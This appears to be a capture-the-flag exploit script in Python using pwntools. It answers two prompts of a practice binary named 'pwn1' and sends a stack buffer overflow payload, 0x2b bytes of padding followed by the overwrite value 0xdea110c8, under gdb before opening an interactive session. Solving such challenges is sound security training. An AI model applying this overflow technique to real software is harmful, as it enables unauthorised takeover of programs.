from pwn import *

payload = b"A"*0x2b
payload+=p32(0xdea110c8)

with open("payload", "wb") as fp:
    fp.write(payload)

t = pwnlib.gdb.debug('./pwn1')

t.sendline("Sir Lancelot of Camelot")
t.sendline("To seek the Holy Grail.")
t.sendline(payload)



t.interactive()
